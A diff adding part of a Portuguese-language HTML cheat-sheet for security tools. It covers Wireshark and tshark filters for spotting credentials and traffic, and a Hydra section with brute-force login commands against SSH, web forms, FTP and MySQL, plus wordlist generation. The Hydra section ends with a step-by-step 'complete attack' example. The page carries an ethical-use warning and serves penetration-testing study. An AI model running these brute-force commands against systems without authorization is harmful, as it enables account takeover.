+                <td>Extrair arquivos HTTP</td>
+                <td>File > Export Objects > HTTP</td>
+              </tr>
+              <tr>
+                <td>Análise de credenciais</td>
+                <td><code>http.request.method == "POST"</code> ou <br><code>ftp.request.command == "PASS"</code></td>
+              </tr>
+              <tr>
+                <td>Problemas de rede</td>
+                <td><code>tcp.analysis.flags</code> para ver retransmissões, <br>duplicados e outros problemas</td>
+              </tr>
+              <tr>
+                <td>Análise de latência</td>
+                <td>Statistics > TCP Stream Graph > Round Trip Time</td>
+              </tr>
+              <tr>
+                <td>Análise de SSL/TLS</td>
+                <td><code>ssl</code> ou <code>tls</code>, Configure decriptação <br>com Edit > Preferences > Protocols >
+                  TLS</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Comandos tshark para análise:</p>
+        <div class="command">
+          <code>tshark -r captura.pcap -Y "http" -T fields -e http.host -e http.request.uri | sort | uniq</code>
+          <button class="copy-btn"
+            data-command="tshark -r captura.pcap -Y 'http' -T fields -e http.host -e http.request.uri | sort | uniq">Copiar</button>
+        </div>
+        <div class="command">
+          <code>tshark -r captura.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c | sort -nr</code>
+          <button class="copy-btn"
+            data-command="tshark -r captura.pcap -Y 'dns' -T fields -e dns.qry.name | sort | uniq -c | sort -nr">Copiar</button>
+        </div>
+        <div class="command">
+          <code>tshark -r captura.pcap -Y "http.request.method == POST" -T fields -e frame.time -e ip.src -e http.host -e http.request.uri</code>
+          <button class="copy-btn"
+            data-command="tshark -r captura.pcap -Y 'http.request.method == POST' -T fields -e frame.time -e ip.src -e http.host -e http.request.uri">Copiar</button>
+        </div>
+      </section>
+
+      <section id="hydra" class="section cybersec">
+        <h2>Hydra</h2>
+        <p>O Hydra é uma ferramenta para testes de força bruta em credenciais, suportando diversos protocolos como HTTP,
+          FTP, SSH, entre outros.</p>
+
+        <div class="info-box danger">
+          <div class="info-box-title">Uso Ético</div>
+          <p>O Hydra é uma ferramenta poderosa que deve ser usada apenas em sistemas onde você tem permissão explícita
+            para testar. Uso não autorizado pode ser ilegal e antiético.</p>
+        </div>
+
+        <h3 id="brute-force">Ataques de Força Bruta</h3>
+        <p>Exemplos de uso em diferentes protocolos:</p>
+
+        <div class="command">
+          <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1</code>
+          <button class="copy-btn"
+            data-command="hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1">Copiar</button>
+        </div>
+        <div class="command">
+          <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"</code>
+          <button class="copy-btn"
+            data-command="hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form '/login.php:username=^USER^&password=^PASS^:F=Login failed'">Copiar</button>
+        </div>
+        <div class="command">
+          <code>hydra -L userlist.txt -P passlist.txt ftp://192.168.1.1</code>
+          <button class="copy-btn"
+            data-command="hydra -L userlist.txt -P passlist.txt ftp://192.168.1.1">Copiar</button>
+        </div>
+        <div class="command">
+          <code>hydra -l admin -P passlist.txt 192.168.1.1 mysql</code>
+          <button class="copy-btn" data-command="hydra -l admin -P passlist.txt 192.168.1.1 mysql">Copiar</button>
+        </div>
+
+        <p>Opções comuns:</p>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Opção</th>
+                <th>Descrição</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>-l login</code></td>
+                <td>Especifica um único nome de usuário</td>
+              </tr>
+              <tr>
+                <td><code>-L arquivo</code></td>
+                <td>Arquivo com lista de nomes de usuário</td>
+              </tr>
+              <tr>
+                <td><code>-p senha</code></td>
+                <td>Especifica uma única senha</td>
+              </tr>
+              <tr>
+                <td><code>-P arquivo</code></td>
+                <td>Arquivo com lista de senhas</td>
+              </tr>
+              <tr>
+                <td><code>-C arquivo</code></td>
+                <td>Arquivo com pares login:senha</td>
+              </tr>
+              <tr>
+                <td><code>-t n</code></td>
+                <td>Número de tarefas paralelas (threads)</td>
+              </tr>
+              <tr>
+                <td><code>-s porta</code></td>
+                <td>Porta para conectar</td>
+              </tr>
+              <tr>
+                <td><code>-o arquivo</code></td>
+                <td>Arquivo para saída</td>
+              </tr>
+              <tr>
+                <td><code>-V</code></td>
+                <td>Modo verboso</td>
+              </tr>
+              <tr>
+                <td><code>-f</code></td>
+                <td>Parar ao encontrar uma senha válida</td>
+              </tr>
+              <tr>
+                <td><code>-R</code></td>
+                <td>Restaura sessão anterior</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 id="wordlists">Wordlists</h3>
+        <p>Wordlists de qualidade são essenciais para testes de força bruta eficazes.</p>
+
+        <div class="card">
+          <div class="card-header">Wordlists Pré-compiladas</div>
+          <p>Localizações comuns em Kali Linux:</p>
+          <ul>
+            <li><code>/usr/share/wordlists/rockyou.txt</code>: Lista popular com 14 milhões de senhas</li>
+            <li><code>/usr/share/wordlists/dirb/</code>: Wordlists para enumerar diretórios</li>
+            <li><code>/usr/share/wordlists/metasploit/</code>: Usadas pelo Metasploit</li>
+            <li><code>/usr/share/wordlists/seclists/</code>: Coleção abrangente de Daniel Miessler</li>
+          </ul>
+        </div>
+
+        <div class="card">
+          <div class="card-header">Geração de Wordlists</div>
+          <p>Ferramentas para gerar wordlists customizadas:</p>
+          <ul>
+            <li><strong>Crunch</strong>: Gera listas baseadas em padrões</li>
+            <li><strong>CeWL</strong>: Extrai palavras de sites para wordlists</li>
+            <li><strong>John the Ripper</strong>: Modo de regras para expansão de wordlists</li>
+            <li><strong>Cupp</strong>: Cria wordlists baseadas em perfis</li>
+          </ul>
+        </div>
+
+        <div class="command">
+          <code>crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt</code>
+          <button class="copy-btn"
+            data-command="crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt">Copiar</button>
+        </div>
+        <div class="command">
+          <code>cewl -d 2 -m 6 -w wordlist.txt http://example.com</code>
+          <button class="copy-btn" data-command="cewl -d 2 -m 6 -w wordlist.txt http://example.com">Copiar</button>
+        </div>
+
+        <p>Exemplo de ataque completo com Hydra:</p>
+        <pre>
+# 1. Coletar informações sobre formulário de login
+curl -s http://example.com/login.php | grep -i form
+
+# 2. Testar manualmente para verificar mensagens de erro
+curl -d "username=test&password=test" http://example.com/login.php
+
+# 3. Gerar wordlist baseada no site
+cewl -d 2 -m 6 -w wordlist.txt http://example.com
+cat /usr/share/wordlists/rockyou.txt >> wordlist.txt
+sort wordlist.txt | uniq > final_wordlist.txt
+
+# 4. Executar Hydra com limite de threads e saída detalhada
+hydra -l admin -P final_wordlist.txt 192.168.1.1 http-post-form \
+"/login.php:username=^USER^&password=^PASS^:F=Authentication failed" \
+-t 4 -V -o hydra_results.txt</pre>
+      </section>
+
+      <!-- Back to top button -->
+      <a href="#" id="backToTop" class="back-to-top">↑</a>
+
+      <!-- Script para copiar comandos, alternância de abas, etc. -->
+      <script>
+        document.addEventListener('DOMContentLoaded', function () {
+          // Gerenciamento de abas
+          const tabBtns = document.querySelectorAll('.tab-btn');
+          tabBtns.forEach(button => {
+            button.addEventListener('click', function () {
+              const tabId = this.getAttribute('data-tab');
+              const tabContent = document.getElementById(tabId);
+
+              // Remover classe ativa de todas as abas
+              document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+              });
+              document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+              });
+
+              // Ativar a aba selecionada
+              this.classList.add('active');
+              tabContent.classList.add('active');
+            });
+          });
+
+          // Copiar comandos para área de transferência
+          const copyButtons = document.querySelectorAll('.copy-btn');
+          copyButtons.forEach(button => {
+            button.addEventListener('click', function () {
+              const command = this.getAttribute('data-command');
+              navigator.clipboard.writeText(command).then(() => {
+                const originalText = this.textContent;
+                this.textContent = 'Copiado!';
+                setTimeout(() => {
+                  this.textContent = originalText;
+                }, 2000);
+              }).catch(err => {
+                console.error('Erro ao copiar texto: ', err);
+              });
+            });
+          });
+
+          // Barra de progresso de rolagem
+          const progressBar = document.getElementById('progressBar');
+          if (progressBar) {
+            window.addEventListener('scroll', function () {
+              const totalHeight = document.documentElement.scrollHeight - window.innerHeight;
+              const progress = (window.scrollY / totalHeight) * 100;
+              progressBar.style.width = progress + '%';
+
+              // Mostrar/esconder botão "voltar ao topo"
+              const backToTopBtn = document.getElementById('backToTop');
+              if (backToTopBtn) {
+                if (window.scrollY > 300) {
+                  backToTopBtn.classList.add('visible');
+                } else {
+                  backToTopBtn.classList.remove('visible');
+                }
+              }
+            });
+          }
+
+          // Botão voltar ao topo
+          const backToTopBtn = document.getElementById('backToTop');
+          if (backToTopBtn) {
+            backToTopBtn.addEventListener('click', function (e) {
+              e.preventDefault();
+              window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+          }
+
+          // Menu mobile
+          const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+          if (mobileMenuBtn) {
+            mobileMenuBtn.addEventListener('click', function () {
+              const sidebar = document.querySelector('.sidebar');
+              sidebar.classList.toggle('active');
+            });
+          }
+
+          // Busca no conteúdo
+          const searchInput = document.getElementById('searchInput');
+          if (searchInput) {
+            searchInput.addEventListener('input', function () {
+              const searchTerm = this.value.toLowerCase();
+              const sections = document.querySelectorAll('.section');
+
+              if (searchTerm.length < 2) {
+                sections.forEach(section => {
+                  section.style.display = 'block';
+                });
+                return;
+              }
+
+              sections.forEach(section => {
+                const text = section.textContent.toLowerCase();
+                if (text.includes(searchTerm)) {
+                  section.style.display = 'block';
+                  // Destacar a primeira ocorrência
+                  const firstMatch = text.indexOf(searchTerm);
+                  if (firstMatch !== -1) {
+                    section.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                  }
+                } else {
+                  section.style.display = 'none';
+                }
+              });
+            });
+          }
+
+          // Alternância de tema claro/escuro
+          const themeToggle = document.getElementById('themeToggle');
+          if (themeToggle) {
+            themeToggle.addEventListener('change', function () {
+              document.body.classList.toggle('dark-mode');
+
+              // Salvar preferência no localStorage
+              if (document.body.classList.contains('dark-mode')) {
+                localStorage.setItem('theme', 'dark');
+              } else {
+                localStorage.setItem('theme', 'light');
+              }
+            });
+
+            // Verificar tema salvo
+            if (localStorage.getItem('theme') === 'dark') {
+              document.body.classList.add('dark-mode');
+              themeToggle.checked = true;
+            }
+          }
+
+          // Links internos com scroll suave
+          document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+              e.preventDefault();
+
+              const targetId = this.getAttribute('href');
+              const targetElement = document.querySelector(targetId);
+
+              if (targetElement) {
+                // Fechar menu mobile se estiver aberto
+                const sidebar = document.querySelector('.sidebar');
+                if (sidebar && sidebar.classList.contains('active')) {
+                  sidebar.classList.remove('active');
+                }
+
+                // Scroll para o elemento
+                targetElement.scrollIntoView({
+                  behavior: 'smooth',
+                  block: 'start'
+                });
+              }
+            });
+          });
+
+          // Ativar links da barra lateral com base na posição de rolagem
+          function highlightCurrentSection() {
+            const sections = Array.from(document.querySelectorAll('.section'));
+
+            if (sections.length === 0) return;
+
+            let currentSection = sections[0].id;
+            const scrollPosition = window.scrollY + 100; // Offset para considerar cabeçalho fixo
+
+            sections.forEach(section => {
+              const sectionTop = section.offsetTop;
+              if (scrollPosition >= sectionTop) {
+                currentSection = section.id;
+              }
+            });
+
+            // Destacar link na barra lateral
+            document.querySelectorAll('.sidebar a').forEach(link => {
+              link.classList.remove('active');
+              if (link.getAttribute('href') === `#${currentSection}`) {
+                link.classList.add('active');
+              }
+            });
+          }
+
+          window.addEventListener('scroll', highlightCurrentSection);
+          highlightCurrentSection(); // Chamar uma vez no carregamento
+
+          // Detectar cliques fora do menu mobile para fechá-lo
+          document.addEventListener('click', function (event) {
+            const sidebar = document.querySelector('.sidebar');
+            const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+
+            if (sidebar && sidebar.classList.contains('active') &&
+              !sidebar.contains(event.target) &&
+              event.target !== mobileMenuBtn) {
+              sidebar.classList.remove('active');
+            }
+          });
+        });
+      </script>
+      </script>
+    </main>
+  </div>
+</body>
+
+</html>
